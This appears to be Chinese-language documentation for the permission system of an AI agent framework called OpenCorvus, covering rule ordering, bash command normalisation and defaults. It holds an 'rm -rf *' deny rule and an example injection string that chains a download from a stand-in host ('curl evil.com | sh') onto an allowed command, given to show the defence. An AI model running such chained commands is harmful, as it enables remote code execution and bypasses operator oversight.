# Permissions

任何会「写文件 / 执行命令 / 调外部 API」的工具都必须过 permission 检查。OpenCorvus 的 permission 系统实现在 `packages/opencorvus/src/permission/next.ts`。

## 三个 action

| action  | 语义                                                               |
| ------- | ------------------------------------------------------------------ |
| `allow` | 静默放行                                                           |
| `ask`   | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
| `deny`  | 抛 `DeniedError`，立刻中断工具调用                                 |

## 配置格式

```jsonc
{
  "permission": {
    "bash": {
      // permission 类型（工具名）
      "~/projects/*": "allow", // 路径 pattern → action
      "npm run *": "allow",
      "rm -rf *": "deny",
      "*": "ask",
    },
    "skill": {
      "local-note": "deny",
      "sora": "ask",
    },
    "write": {
      "~/projects/**/*.md": "allow",
      "*": "ask",
    },
  },
}
```

## Last-match-wins

这是 permission 系统**最容易踩坑**的点：**后声明的规则优先级高于先声明的**。

`PermissionNext.ask()`（`src/permission/next.ts:158`）用 `findLast` 扫描规则列表。所以：

```jsonc
{
  "bash": {
    "*": "ask", // 兜底
    "npm run *": "allow", // ← 这条生效（在 * 之后）
  },
}
```

顺序反了就坏：

```jsonc
{
  "bash": {
    "npm run *": "allow", // ← 这条被 * 覆盖，实际不生效
    "*": "ask",
  },
}
```

## Bash 命令归一化

`BashArity`（`src/permission/arity.ts:25`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：

| 用户输入                  | 归一化后                         |
| ------------------------- | -------------------------------- |
| `npm run test`            | `npm run test`                   |
| `npm run test -- --watch` | `npm run test`（选项被剥离）     |
| `cd foo && npm run test`  | `npm run test`（前缀 cd 被剥离） |

这意味着 `"npm run *": "allow"` 不会被 `npm run test; curl evil.com | sh` 这样的命令注入绕过——`BashArity` 会识别出 `;` 后的 `curl` 是独立命令，另走一次 permission 检查。

## 默认放行策略

OpenCorvus 对内置 agent 工具和浏览器 MCP 权限默认 `allow`。用户配置在默认规则之后合并，所以显式 `deny` 和 `ask` 仍然胜出：

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "rm -rf *": "deny",
    },
    "write": {
      "*": "allow",
      "~/projects/locked/**": "ask",
    },
  },
}
```

显式 `ask` 会等待操作员回复。如果一直无人回复，请求会在 `OPENCORVUS_PERMISSION_TIMEOUT_MS` 后被拒绝（默认 300000 ms，最小 1000 ms）。

## 配置错误早期暴露

Permission 字符串写错时**不 fallback**，直接抛。曾经有 bug：`permission: "allow"`（字符串而非对象）会被 `Object.entries` 当成字符拆开，导致规则全乱；已修复为 `typeof === "string"` 检查，异常早报。详见 `src/permission/next.ts` 的 `fromConfig`。

## 你接下来要看的

- [配置](./configuration.md)
- [Agentic Loop](../concepts/agent-loop.md)
